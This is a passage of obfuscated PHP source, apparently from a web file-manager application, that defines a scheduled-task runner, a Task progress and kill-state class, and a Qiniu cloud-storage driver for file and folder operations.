self::log($½ĞÈØÉë[1747]); } public static function config($‘ÔÜæÄ, $Œ˜ãÓ³) { self::valueSet($_SERVER[÷åé¼î][815], $‘ÔÜæÄ); } private static function taskRunAll() { $„€‚ğ± =& $_SERVER[÷åé¼î]; $Ü“·£€ò = timeFloat(); $ªÄË¿Ö¢ = Model($„€‚ğ±[1748])->listData(); $ä²œÉ÷« = count($ªÄË¿Ö¢); for ($Í àí¶¹ = 0; $Í àí¶¹ < $ä²œÉ÷«; $Í àí¶¹++) { $˜ÊñÕŞŞ = $ªÄË¿Ö¢[$Í àí¶¹]; if (!$˜ÊñÕŞŞ[$„€‚ğ±[459]] || $˜ÊñÕŞŞ[$„€‚ğ±[1749]] != $„€‚ğ±[91]) { continue; } if (!self::taskTimeCheck($˜ÊñÕŞŞ)) { continue; } self::taskRun($˜ÊñÕŞŞ); } Hook::trigger($„€‚ğ±[1750]); self::taskQueueRun($Ü“·£€ò); } private static function taskQueueRun($‹‘ä·®²) { $Ò˜™›Æ = 10; while (!0) { $Ößû†óƒ = TaskQueue::run(); if ($Ößû†óƒ === !1) { break; } if (timeFloat() - $‹‘ä·®² >= $Ò˜™›Æ) { break; } } } private static function taskTimeCheck($Ìßú®Á—) { $¾¢¼î²Ú =& $_SERVER[÷åé¼î]; $Õı˜¾å® = json_decode($Ìßú®Á—[$¾¢¼î²Ú[206]], !0); $©òØË“ = intval($Ìßú®Á—[$¾¢¼î²Ú[1730]]); $¼Ğˆ°ûÒ = strtotime($¾¢¼î²Ú[1751] . $Õı˜¾å®[$¾¢¼î²Ú[1752]] . $¾¢¼î²Ú[1753]) - strtotime($¾¢¼î²Ú[1754]); $¦İö·­Ì = time() - strtotime(date($¾¢¼î²Ú[1755]) . $¾¢¼î²Ú[1756]); $ğ´´¬˜ã = $¦İö·­Ì >= $¼Ğˆ°ûÒ && $¦İö·­Ì <= $¼Ğˆ°ûÒ + 3600; switch ($Õı˜¾å®[$¾¢¼î²Ú[33]]) { case $¾¢¼î²Ú[1757]: if (time() - $©òØË“ < 3600 * 24 * 30) { return !1; } if ($Õı˜¾å®[$¾¢¼î²Ú[1757]] == date($¾¢¼î²Ú[1758]) && $ğ´´¬˜ã) { return !0; } break; case $¾¢¼î²Ú[1759]: if (time() - $©òØË“ < 3600 * 24 * 7) { return !1; } $šõğöá = date($¾¢¼î²Ú[1760]) == 0 ? 7 : date($¾¢¼î²Ú[1760]); if ($Õı˜¾å®[$¾¢¼î²Ú[1759]] == $šõğöá && $ğ´´¬˜ã) { return !0; } break; case $¾¢¼î²Ú[1752]: if (time() - $©òØË“ < 3600 * 24) { return !1; } if ($ğ´´¬˜ã) { return !0; } break; case $¾¢¼î²Ú[1761]: if (time() - $©òØË“ >= floatval($Õı˜¾å®[$¾¢¼î²Ú[1761]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÒåàğüÀ =& $_SERVER[÷åé¼î]; static $µÈÆÑÎ = 0; $ƒû¸ÄÅ« = 300; if (!$µÈÆÑÎ) { $µÈÆÑÎ = time(); } if (time() - $µÈÆÑÎ < $ƒû¸ÄÅ«) { return; } $µÈÆÑÎ = time(); $¤úàİÜ¦ = Model($ÒåàğüÀ[561])->db($ÒåàğüÀ[12]); if ($¤úàİÜ¦) { $¤úàİÜ¦->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÒåàğüÀ[1762], $ÒåàğüÀ[1763]); die; } } public static function taskRun($ÌãŒ¹×¬) { $ö¶ğÖ =& $_SERVER[÷åé¼î]; self::log($ö¶ğÖ[1764] . $ÌãŒ¹×¬[$ö¶ğÖ[459]] . $ö¶ğÖ[1765] . $ÌãŒ¹×¬[$ö¶ğÖ[32]] . $ö¶ğÖ[1766] . $ÌãŒ¹×¬[$ö¶ğÖ[1767]]); Model($ö¶ğÖ[1748])->run($ÌãŒ¹×¬[$ö¶ğÖ[459]]); $Œõ¢û› = timeFloat(); $ßÜ¼ƒ§ = $ö¶ğÖ[12]; switch ($ÌãŒ¹×¬[$ö¶ğÖ[33]]) { case $ö¶ğÖ[367]: $ÎÆ¢ŒŞ = url_request($ÌãŒ¹×¬[$ö¶ğÖ[1767]], $ö¶ğÖ[261], !1, !1, !1, !1, 10); if ($ÎÆ¢ŒŞ[$ö¶ğÖ[815]]) { $ßÜ¼ƒ§ = strlen($ÎÆ¢ŒŞ[$ö¶ğÖ[1281]]); } break; case $ö¶ğÖ[260]: $ßÜ¼ƒ§ = Hook::apply($ÌãŒ¹×¬[$ö¶ğÖ[1767]]); default: break; } Model($ö¶ğÖ[1768])->add(array($ö¶ğÖ[1769] => $ö¶ğÖ[12], $ö¶ğÖ[1770] => $ö¶ğÖ[228], $ö¶ğÖ[33] => $ö¶ğÖ[1771] . $ÌãŒ¹×¬[$ö¶ğÖ[459]], $ö¶ğÖ[1772] => json_encode(array($ö¶ğÖ[32] => $ÌãŒ¹×¬[$ö¶ğÖ[32]], $ö¶ğÖ[1773] => timeFloat() - $Œõ¢û›, $ö¶ğÖ[353] => $ßÜ¼ƒ§)))); $ åÕëöâ = $ßÜ¼ƒ§ ? $ö¶ğÖ[1774] . $ßÜ¼ƒ§ : $ö¶ğÖ[12]; self::log($ö¶ğÖ[1775] . $ÌãŒ¹×¬[$ö¶ğÖ[459]] . $ö¶ğÖ[178] . $ åÕëöâ); return !0; } public static function valueGet($¯ıœñô©) { $‘Õ°¬Ä‡ =& $_SERVER[÷åé¼î]; $Äñ–àÒ = $‘Õ°¬Ä‡[1776]; $¹´÷ô”¢ = Model($‘Õ°¬Ä‡[492])->get($¯ıœñô©, $Äñ–àÒ); if (is_null($¹´÷ô”¢)) { Model($‘Õ°¬Ä‡[492])->set($‘Õ°¬Ä‡[815], $‘Õ°¬Ä‡[91], $Äñ–àÒ); Model($‘Õ°¬Ä‡[492])->set($‘Õ°¬Ä‡[1729], $‘Õ°¬Ä‡[228], $Äñ–àÒ); $¹´÷ô”¢ = Model($‘Õ°¬Ä‡[492])->get($¯ıœñô©, $Äñ–àÒ); } return $¹´÷ô”¢; } private static function valueSet($Ü°Ê¬’Ò, $ÃÃ†¸ = false) { $Ïš‹½¨£ =& $_SERVER[÷åé¼î]; $øã½µÂ = $Ïš‹½¨£[1777]; CacheLock::lock($øã½µÂ); $…ÄÄ’Ş = Model($Ïš‹½¨£[492])->set($Ü°Ê¬’Ò, $ÃÃ†¸, $Ïš‹½¨£[1776]); CacheLock::unlock($øã½µÂ); return $…ÄÄ’Ş; } protected static function log($…’÷»‘¿) { write_log($…’÷»‘¿, $_SERVER[÷åé¼î][1763]); } private static function cacheClear() { $Çİ¯Æİ’ =& $_SERVER[÷åé¼î]; Cache::clearMemory(Model($Çİ¯Æİ’[492])->cacheKey($Çİ¯Æİ’[1776])); Cache::clearMemory(Model($Çİ¯Æİ’[492])->cacheKey($Çİ¯Æİ’[1778])); Model($Çİ¯Æİ’[1748])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($îÛ°÷›, $İğàÜïŞ = '', $±—æºµñ = 0, $¦Øİêµœ = '') { $î¦éá®Â =& $_SERVER[÷åé¼î]; if (self::get($îÛ°÷›)) { return; } $this->task = array($î¦éá®Â[459] => $îÛ°÷›, $î¦éá®Â[1779] => USER_ID, $î¦éá®Â[1668] => $¦Øİêµœ, $î¦éá®Â[510] => $î¦éá®Â[12], $î¦éá®Â[33] => $İğàÜïŞ, $î¦éá®Â[1137] => $î¦éá®Â[12], $î¦éá®Â[1135] => $±—æºµñ, $î¦éá®Â[1780] => 0, $î¦éá®Â[1781] => 0, $î¦éá®Â[1782] => 0, $î¦éá®Â[1783] => timeFloat(), $î¦éá®Â[1784] => 0, $î¦éá®Â[1785] => 0, $î¦éá®Â[1786] => 0, $î¦éá®Â[1787] => 0, $î¦éá®Â[815] => $î¦éá®Â[1729]); $GLOBALS[$î¦éá®Â[1788]] = 1; Hook::bind($î¦éá®Â[1733], array($this, $î¦éá®Â[1789])); Hook::bind($î¦éá®Â[1790], array($this, $î¦éá®Â[1791])); $this->startAfter(); Hook::trigger($î¦éá®Â[1792], $this->task); $this->task[$î¦éá®Â[1785]] = timeFloat(); } public function end($Ğ¬•§™à = '') { $®º­Ô…¼ =& $_SERVER[÷åé¼î]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$®º­Ô…¼[1785]]) { self::valueSet($this->task[$®º­Ô…¼[459]], !1); } $this->isEnd = !0; if ($Ğ¬•§™à) { $this->task[$®º­Ô…¼[510]] = $Ğ¬•§™à; } self::log($®º­Ô…¼[1793] . $this->task[$®º­Ô…¼[459]] . $®º­Ô…¼[1794] . sprintf($®º­Ô…¼[915], timeFloat() - $this->task[$®º­Ô…¼[1783]]) . $®º­Ô…¼[1795]); Hook::unbind($®º­Ô…¼[1733], array($this, $®º­Ô…¼[1789])); Hook::unbind($®º­Ô…¼[1790], array($this, $®º­Ô…¼[1791])); $this->endAfter(); $øŸ·¤İ® = $this->task; $this->task = !1; Hook::trigger($®º­Ô…¼[1796], $øŸ·¤İ®); } public function update($«’ğ« = 0, $êÈ¿Ïìİ = false) { $´ÇöîéÁ =& $_SERVER[÷åé¼î]; $ØÙŠ®‚µ =& $this->task; if (!$ØÙŠ®‚µ) { return; } $ØÙŠ®‚µ[$´ÇöîéÁ[1780]] += $«’ğ«; $ØÙŠ®‚µ[$´ÇöîéÁ[1784]] = timeFloat(); if ($ØÙŠ®‚µ[$´ÇöîéÁ[1135]]) { if ($ØÙŠ®‚µ[$´ÇöîéÁ[1135]] < $ØÙŠ®‚µ[$´ÇöîéÁ[1780]]) { $ØÙŠ®‚µ[$´ÇöîéÁ[1135]] = $ØÙŠ®‚µ[$´ÇöîéÁ[1780]]; } $›£ï½Œª = timeFloat() - $ØÙŠ®‚µ[$´ÇöîéÁ[1783]] - $ØÙŠ®‚µ[$´ÇöîéÁ[1786]]; if ($›£ï½Œª <= 0) { $›£ï½Œª = 0.001; } $ØÙŠ®‚µ[$´ÇöîéÁ[1781]] = $ØÙŠ®‚µ[$´ÇöîéÁ[1780]] / $ØÙŠ®‚µ[$´ÇöîéÁ[1135]]; $ØÙŠ®‚µ[$´ÇöîéÁ[1782]] = $ØÙŠ®‚µ[$´ÇöîéÁ[1780]] / $›£ï½Œª; if ($ØÙŠ®‚µ[$´ÇöîéÁ[1781]] > 0) { $ØÙŠ®‚µ[$´ÇöîéÁ[1787]] = $›£ï½Œª * (1 - $ØÙŠ®‚µ[$´ÇöîéÁ[1781]]) / $ØÙŠ®‚µ[$´ÇöîéÁ[1781]]; } $ØÙŠ®‚µ[$´ÇöîéÁ[1787]] = $ØÙŠ®‚µ[$´ÇöîéÁ[1787]] <= 0 ? 0 : $ØÙŠ®‚µ[$´ÇöîéÁ[1787]]; } $this->updateAfter(); $µÁÂ‹‡ = 0.2; if (timeFloat() - $ØÙŠ®‚µ[$´ÇöîéÁ[1785]] < $µÁÂ‹‡ && !$êÈ¿Ïìİ) { return; } $±Î¨×™ã = self::get($ØÙŠ®‚µ[$´ÇöîéÁ[459]]); $ô¬ÌÇïÙ = $±Î¨×™ã[$´ÇöîéÁ[815]]; if ($ô¬ÌÇïÙ == self::STATYS_KILL) { $‚…’Ş‰ß = array($´ÇöîéÁ[1797] => LNG($´ÇöîéÁ[1798]), $´ÇöîéÁ[1291] => !1); Cache::set($´ÇöîéÁ[1799] . $this->task[$´ÇöîéÁ[459]], $‚…’Ş‰ß, 30); $this->onKill(); $this->end(); die; } else { if ($ô¬ÌÇïÙ == self::STATYS_STOP) { $Ù›¿ôúš = 2; $±Î¨×™ã[$´ÇöîéÁ[1786]] += $Ù›¿ôúš; self::valueSet($ØÙŠ®‚µ[$´ÇöîéÁ[459]], $±Î¨×™ã); sleep($Ù›¿ôúš); $this->update(); return; } } $ØÙŠ®‚µ[$´ÇöîéÁ[815]] = $ô¬ÌÇïÙ ? $ô¬ÌÇïÙ : $ØÙŠ®‚µ[$´ÇöîéÁ[815]]; $ØÙŠ®‚µ[$´ÇöîéÁ[1786]] = $±Î¨×™ã[$´ÇöîéÁ[1786]] ? $±Î¨×™ã[$´ÇöîéÁ[1786]] : 0; $ØÙŠ®‚µ[$´ÇöîéÁ[1785]] = timeFloat(); Hook::trigger($´ÇöîéÁ[1800], $ØÙŠ®‚µ); self::valueSet($ØÙŠ®‚µ[$´ÇöîéÁ[459]], $ØÙŠ®‚µ); } public function onKillSet($ÇÂá‚Å, $Îï»Ÿ = array()) { $this->onKillCall = array($ÇÂá‚Å, $Îï»Ÿ); } public function onKill() { $ì´ÇàÉÑ =& $_SERVER[÷åé¼î]; self::log($ì´ÇàÉÑ[1793] . $this->task[$ì´ÇàÉÑ[459]] . $ì´ÇàÉÑ[1801]); Hook::trigger($ì´ÇàÉÑ[1802], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ ÛÊá‘) { $†–ÚÆ–Ş =& $_SERVER[÷åé¼î]; Cache::set($†–ÚÆ–Ş[1799] . $this->task[$†–ÚÆ–Ş[459]], $ ÛÊá‘, 60); return $ ÛÊá‘; } public static function get($×¨‚Ô÷©) { $Åø¶¾Š‰ =& $_SERVER[÷åé¼î]; $¬­¯©‡¬ = self::valueGet($×¨‚Ô÷©); if (is_array($¬­¯©‡¬) && $¬­¯©‡¬[$Åø¶¾Š‰[1803]]) { $œ™¬•µ = ActionApply($¬­¯©‡¬[$Åø¶¾Š‰[1803]], array($¬­¯©‡¬)); $¬­¯©‡¬ = is_array($œ™¬•µ) ? $œ™¬•µ : $¬­¯©‡¬; } return $¬­¯©‡¬; } public static function listData() { $“îÕƒŠ = self::valueGet(); return array_sort_by($“îÕƒŠ, $_SERVER[÷åé¼î][1783], !0); } public static function kill($çô°´Û­) { return self::changeStatus($çô°´Û­, self::STATYS_KILL); } public static function stop($Ç¬ÇÈÏ») { return self::changeStatus($Ç¬ÇÈÏ», self::STATYS_STOP); } public static function restart($ƒÈø”¦º) { return self::changeStatus($ƒÈø”¦º, self::STATYS_RUNNING); } public static function killAll() { $¦­èî¤Ñ =& $_SERVER[÷åé¼î]; $òÈ›ÀÄƒ = self::listData(); foreach ($òÈ›ÀÄƒ as $¼¡öõÄî) { self::kill($¼¡öõÄî[$¦­èî¤Ñ[459]]); } sleep(2); foreach ($òÈ›ÀÄƒ as $¼¡öõÄî) { self::valueSet($¼¡öõÄî[$¦­èî¤Ñ[459]], !1); } } private static function changeStatus($ù²¸ÇÉæ, $ƒİ©¨“) { $ß¨ĞÄÙ =& $_SERVER[÷åé¼î]; $¸ÓàÚ = self::valueGet($ù²¸ÇÉæ); if (!$¸ÓàÚ) { return !1; } $¸ÓàÚ[$ß¨ĞÄÙ[815]] = $ƒİ©¨“; self::valueSet($ù²¸ÇÉæ, $¸ÓàÚ); self::log($ß¨ĞÄÙ[1804] . $¸ÓàÚ[$ß¨ĞÄÙ[459]] . $ß¨ĞÄÙ[1805] . $ƒİ©¨“); return !0; } public static function valueGet($­ıÒ¾² = false) { $ÖØÊ‚ê‡ =& $_SERVER[÷åé¼î]; if ($­ıÒ¾²) { $½…üë‚Ö = Model($ÖØÊ‚ê‡[504])->where(array($ÖØÊ‚ê‡[97] => $­ıÒ¾², $ÖØÊ‚ê‡[33] => $ÖØÊ‚ê‡[1144]))->find(); return $½…üë‚Ö ? json_decode($½…üë‚Ö[$ÖØÊ‚ê‡[434]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ì¼Â¶Œ = false) { $İØ²ı¢¡ =& $_SERVER[÷åé¼î]; $â£İâÕˆ = array($İØ²ı¢¡[33] => $İØ²ı¢¡[1144]); if ($Ì¼Â¶Œ) { $â£İâÕˆ[$İØ²ı¢¡[1779]] = $Ì¼Â¶Œ; } $ÜŸÅÙò = Model($İØ²ı¢¡[504])->where($â£İâÕˆ)->select(); $ÜŸÅÙò = $ÜŸÅÙò ? $ÜŸÅÙò : array(); foreach ($ÜŸÅÙò as $ÜäàÙˆ => $Ç£éø«) { $ÜŸÅÙò[$ÜäàÙˆ] = json_decode($Ç£éø«[$İØ²ı¢¡[434]], !0); } return $ÜŸÅÙò; } public static function valueSet($æ²ÆÚÄ’, $Ãµƒô—Ç) { $œÃ½½í =& $_SERVER[÷åé¼î]; if (!$Ãµƒô—Ç) { return Model($œÃ½½í[504])->where(array($œÃ½½í[97] => $æ²ÆÚÄ’, $œÃ½½í[33] => $œÃ½½í[1144]))->delete(); } $ı˜Î´Óá = json_encode($Ãµƒô—Ç); if (!$ı˜Î´Óá) { ob_start(); var_dump($Ãµƒô—Ç); $—´Ÿ®Úú = ob_get_clean(); self::log($œÃ½½í[1806] . json_encode_force($—´Ÿ®Úú)); } if (!$æ²ÆÚÄ’ || !$Ãµƒô—Ç[$œÃ½½í[459]]) { return !1; } $ßµ¶©íÊ = array($œÃ½½í[33] => $œÃ½½í[1144], $œÃ½½í[1779] => USER_ID, $œÃ½½í[97] => $æ²ÆÚÄ’, $œÃ½½í[434] => $ı˜Î´Óá); $î‹ş¥¼À = $œÃ½½í[1807]; CacheLock::lock($î‹ş¥¼À); Model($œÃ½½í[504])->add($ßµ¶©íÊ, array(), !0); CacheLock::unlock($î‹ş¥¼À); } public static function log($¨Ïªû¢Ë) { if (!GLOBAL_DEBUG) { return; } write_log($¨Ïªû¢Ë, $_SERVER[÷åé¼î][1808]); } } goto EŸ…ê‡ë„; C£áî¡ñï: define($_SERVER[÷åé¼î][299], 1); define($_SERVER[÷åé¼î][300], 2); define($_SERVER[÷åé¼î][301], 3); goto eÉÔâíÓë; c†Ä«æ ±: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($†ğÀ¯á) { parent::__construct(); require_once SDK_DIR . $_SERVER[÷åé¼î][1526]; $this->_init($†ğÀ¯á); } public function _init($º¥ä¦Ã³) { $‚¶›ÀÃ“ =& $_SERVER[÷åé¼î]; $this->config = $º¥ä¦Ã³; foreach ($º¥ä¦Ã³ as $‚ô¢€¼ => $Ø÷ÒÚ×Œ) { if (isset($this->{$‚ô¢€¼})) { $this->{$‚ô¢€¼} = $Ø÷ÒÚ×Œ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‚¶›ÀÃ“[1527] . LNG($‚¶›ÀÃ“[1460])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($œ„Ì­â­, $—Œ…İğè = '', $¼¸éãÃõ = REPEAT_RENAME) { if ($this->setContent($œ„Ì­â­, $—Œ…İğè)) { return $this->getPathOuter($œ„Ì­â­); } return !1; } public function mkdir($ïÊ†ƒ•, $§ÅíİÓ = REPEAT_SKIP) { $ğ•ĞÌ¡ =& $_SERVER[÷åé¼î]; $ê®ˆ²®ğ = trim($ïÊ†ƒ•, $ğ•ĞÌ¡[8]); if ($this->_isFolder($ê®ˆ²®ğ)) { return $this->getPathOuter($ê®ˆ²®ğ); } $ïÊ†ƒ• = $ê®ˆ²®ğ . $ğ•ĞÌ¡[8]; $ù¸œŒ = get_path_this($ê®ˆ²®ğ); $ú˜¯øÊØ = $ïÊ†ƒ• . $ù¸œŒ; if (!$this->mkfile($ú˜¯øÊØ)) { return !1; } if (!$this->moveFile($ú˜¯øÊØ, $ïÊ†ƒ•)) { $this->delFile($ú˜¯øÊØ); return !1; } return $this->getPathOuter($ê®ˆ²®ğ); } public function copyFile($æ³Ø¸’ş, $Öâ×— …) { $¾»Ú²–€ = $this->bucketManager->copy($this->bucket, $æ³Ø¸’ş, $this->bucket, $Öâ×— …, !0); return $¾»Ú²–€ ? !1 : $this->getPathOuter($Öâ×— …); } public function moveFile($Ã‚¤ÚŠé, $ı¬ƒ£é) { $¼¹à§å¦ = $this->bucketManager->move($this->bucket, $Ã‚¤ÚŠé, $this->bucket, $ı¬ƒ£é, !0); return $¼¹à§å¦ ? !1 : $this->getPathOuter($ı¬ƒ£é); } public function delFile($¤‰Àµ¦º) { if (!$this->exist($¤‰Àµ¦º)) { return !0; } $½‘÷¡¬ = $this->bucketManager->delete($this->bucket, $¤‰Àµ¦º); return $½‘÷¡¬ ? !1 : !0; } public function delFolder($Ö³¦ş¥Ö) { $ª´ÁºÆ¼ =& $_SERVER[÷åé¼î]; if (!$this->exist($Ö³¦ş¥Ö)) { return !0; } $this->listItemCache = !1; $€ˆ¡¹•¿ = $this->fileList($Ö³¦ş¥Ö); $this->listItemCache = !0; $ƒúëë¿À = trim($Ö³¦ş¥Ö, $ª´ÁºÆ¼[8]) . $ª´ÁºÆ¼[8]; if (!empty($Ö³¦ş¥Ö) && $Ö³¦ş¥Ö !== $ª´ÁºÆ¼[228] && !in_array($ƒúëë¿À, $€ˆ¡¹•¿[$ª´ÁºÆ¼[85]])) { $€ˆ¡¹•¿[$ª´ÁºÆ¼[85]][] = $ƒúëë¿À; } $×úĞÛ = $this->delByBatch($€ˆ¡¹•¿[$ª´ÁºÆ¼[86]]); if (!$×úĞÛ) { return !1; } $×úĞÛ = $this->delByBatch($€ˆ¡¹•¿[$ª´ÁºÆ¼[85]]); if (!$×úĞÛ) { return !1; } return $this->delFile($ƒúëë¿À); } private function delByBatch($¶á®¤³) { foreach (array_chunk($¶á®¤³, 1000) as $×­ÁÑµÜ) { $ñı€ôœ¼ = $this->bucketManager->buildBatchDelete($this->bucket, $×­ÁÑµÜ); list($ÏÉ¶î¸, $Ä¶Ò©…) = $this->bucketManager->batch($ñı€ôœ¼); if ($Ä¶Ò©…) { return !1; } } return !0; } public function rename($åßÈ÷Œ, $°Ò¸¿õ») { return $this->renameObject($åßÈ÷Œ, $°Ò¸¿õ»); } public function fileInfo($¼õœ­», $·ÔÙäùÛ = false, $Œ¢ÈÌüÏ = array()) { $­–ßè´Ô =& $_SERVER[÷åé¼î]; $³Ü–¼¨ˆ = array($­–ßè´Ô[32] => $this->pathThis($¼õœ­»), $­–ßè´Ô[87] => $this->getPathOuter($­–ßè´Ô[8] . $¼õœ­»), $­–ßè´Ô[33] => $­–ßè´Ô[230], $­–ßè´Ô[79] => isset($Œ¢ÈÌüÏ[$­–ßè´Ô[1528]]) ? $Œ¢ÈÌüÏ[$­–ßè´Ô[1528]] : 0, $­–ßè´Ô[169] => $this->ext($¼õœ­»)); if ($·ÔÙäùÛ) { return $³Ü–¼¨ˆ; } $³Ü–¼¨ˆ[$­–ßè´Ô[231]] = $³Ü–¼¨ˆ[$­–ßè´Ô[88]] = 0; $³Ü–¼¨ˆ[$­–ßè´Ô[232]] = $³Ü–¼¨ˆ[$­–ßè´Ô[233]] = !0; if (empty($Œ¢ÈÌüÏ)) { $Œ¢ÈÌüÏ = $this->objectMeta($¼õœ­»); if (!$Œ¢ÈÌüÏ) { return $³Ü–¼¨ˆ; } } if (isset($Œ¢ÈÌüÏ[$­–ßè´Ô[234]]) && $Œ¢ÈÌüÏ[$­–ßè´Ô[234]]) { $³Ü–¼¨ˆ[$­–ßè´Ô[235]] = $Œ¢ÈÌüÏ[$­–ßè´Ô[234]]; } if (isset($Œ¢ÈÌüÏ[$­–ßè´Ô[245]]) && $Œ¢ÈÌüÏ[$­–ßè´Ô[245]]) { $³Ü–¼¨ˆ[$­–ßè´Ô[235]] = $Œ¢ÈÌüÏ[$­–ßè´Ô[245]]; } if (isset($Œ¢ÈÌüÏ[$­–ßè´Ô[1529]])) { $³Ü–¼¨ˆ[$­–ßè´Ô[88]] = substr($Œ¢ÈÌüÏ[$­–ßè´Ô[1529]] . $­–ßè´Ô[12], 0, 10); } if (isset($Œ¢ÈÌüÏ[$­–ßè´Ô[1528]])) { $³Ü–¼¨ˆ[$­–ßè´Ô[79]] = $Œ¢ÈÌüÏ[$­–ßè´Ô[1528]]; } return $³Ü–¼¨ˆ; } public function folderInfo($ØÖ§†Ó, $ÃÛğ‰¬‹ = false) { $×ÒÅŸõ½ =& $_SERVER[÷åé¼î]; $£İ¨¢é‚ = array($×ÒÅŸõ½[32] => $this->pathThis($ØÖ§†Ó), $×ÒÅŸõ½[87] => $this->getPathOuter($×ÒÅŸõ½[8] . $ØÖ§†Ó), $×ÒÅŸõ½[33] => $×ÒÅŸõ½[78]); if ($ÃÛğ‰¬‹) { return $£İ¨¢é‚; } $£İ¨¢é‚[$×ÒÅŸõ½[231]] = $£İ¨¢é‚[$×ÒÅŸõ½[88]] = 0; $£İ¨¢é‚[$×ÒÅŸõ½[232]] = $£İ¨¢é‚[$×ÒÅŸõ½[233]] = !0; $ØÖ§†Ó = rtrim($ØÖ§†Ó, $×ÒÅŸõ½[8]) . $×ÒÅŸõ½[8]; $º×ì¢ØÓ = $this->objectMeta($ØÖ§†Ó); if (isset($º×ì¢ØÓ[$×ÒÅŸõ½[1529]])) { $£İ¨¢é‚[$×ÒÅŸõ½[88]] = substr($º×ì¢ØÓ[$×ÒÅŸõ½[1529]] . $×ÒÅŸõ½[12], 0, 10); } return $£İ¨¢é‚; } public function listPath($õ­“øåï, $ŞËĞ¢• = false) { $™¾üÇ†Ê =& $_SERVER[÷åé¼î]; $ºïÄ˜şî = $this->fileList($õ­“øåï, $™¾üÇ†Ê[8], !0); foreach ($ºïÄ˜şî[$™¾üÇ†Ê[85]] as $İ¼Ø˜“İ => $»«Çò) { $ºïÄ˜şî[$™¾üÇ†Ê[85]][$İ¼Ø˜“İ] = $this->folderInfo($»«Çò, $ŞËĞ¢•); } foreach ($ºïÄ˜şî[$™¾üÇ†Ê[86]] as $İ¼Ø˜“İ => $»«Çò) { $ºïÄ˜şî[$™¾üÇ†Ê[86]][$İ¼Ø˜“İ] = $this->fileInfo($»«Çò[$™¾üÇ†Ê[97]], $ŞËĞ¢•, $»«Çò); } return $ºïÄ˜şî; } public function has($ŸïÉúÖâ, $ó‡Ü¦­ó = false, $±°ÔôÀñ = true) { $Æ§‘ƒ¿Â =& $_SERVER[÷åé¼î]; $ŸïÉúÖâ = trim($ŸïÉúÖâ, $Æ§‘ƒ¿Â[8]); $ÚîÂ”¶à = empty($ŸïÉúÖâ) && $ŸïÉúÖâ !== $Æ§‘ƒ¿Â[228] ? $Æ§‘ƒ¿Â[12] : $ŸïÉúÖâ . $Æ§‘ƒ¿Â[8]; $ÜÖºááÛ = $Æ§‘ƒ¿Â[12]; $·˜øù¢Í = 500; $Şš¸õ”È = $Æ§‘ƒ¿Â[8]; $ñ·‘Â€‘ = $ÊĞªÎÍ = 0; while (!0) { check_abort(); list($ñ“§Æ„ó, $ÉêÚŸõ‚) = $this->bucketManager->listFiles($this->bucket, $ÚîÂ”¶à, $ÜÖºááÛ, $·˜øù¢Í, $Şš¸õ”È); if ($ÉêÚŸõ‚) { break; } $ÜÖºááÛ = array_key_exists($Æ§‘ƒ¿Â[1472], $ñ“§Æ„ó) ? $ÜÖºááÛ = $ñ“§Æ„ó[$Æ§‘ƒ¿Â[1530]] : $Æ§‘ƒ¿Â[12]; if ($ó‡Ü¦­ó) { if (!empty($ñ“§Æ„ó[$Æ§‘ƒ¿Â[1531]])) { $ñ·‘Â€‘ += count($ñ“§Æ„ó[$Æ§‘ƒ¿Â[1531]]); } if (!empty($ñ“§Æ„ó[$Æ§‘ƒ¿Â[1532]])) { $ÊĞªÎÍ += count($ñ“§Æ„ó[$Æ§‘ƒ¿Â[1532]]); } if ($ÜÖºááÛ === $Æ§‘ƒ¿Â[12]) { break; } continue; } if ($±°ÔôÀñ) { if (!empty($ñ“§Æ„ó[$Æ§‘ƒ¿Â[1531]])) { return !0; } } else { if (!empty($ñ“§Æ„ó[$Æ§‘ƒ¿Â[1532]])) { return !0; } } if ($ÜÖºááÛ === $Æ§‘ƒ¿Â[12]) { break; } } if ($ó‡Ü¦­ó) { return array($Æ§‘ƒ¿Â[239] => $ñ·‘Â€‘, $Æ§‘ƒ¿Â[240] => $ÊĞªÎÍ); } return !1; } public function listAll($Â£›‰³¢) { $Ã¸‡Æœê =& $_SERVER[÷åé¼î]; $ ¬·å¬ = $this->fileList($Â£›‰³¢, $Ã¸‡Æœê[12], !0); $·üÔÁ = array_to_keyvalue($ ¬·å¬[$Ã¸‡Æœê[86]], $Ã¸‡Æœê[32]); foreach ($ ¬·å¬[$Ã¸‡Æœê[85]] as $ÓÛËğÄ·) { if (is_string($ÓÛËğÄ·)) { $·üÔÁ[$ÓÛËğÄ·] = array($Ã¸‡Æœê[79] => 0); } } return $this->listAllFiles($Â£›‰³¢, $·üÔÁ); } private function fileList($¢Ëìú‡â, $íøº’„ = '', $Ÿş©†Ûæ = 0) { $ºÄ‚†¦Ê =& $_SERVER[÷åé¼î]; $¢Ëìú‡â = trim($¢Ëìú‡â, $ºÄ‚†¦Ê[8]); $İŸÑÃû­ = empty($¢Ëìú‡â) && $¢Ëìú‡â !== $ºÄ‚†¦Ê[228] ? $ºÄ‚†¦Ê[12] : $¢Ëìú‡â . $ºÄ‚†¦Ê[8]; $ƒ€ã«©Ğ = $ºÄ‚†¦Ê[12]; $“¡°ñßÇ = 1000; $úÄ®Ñêñ = $óÃ€‘•¢ = array(); while (!0) { 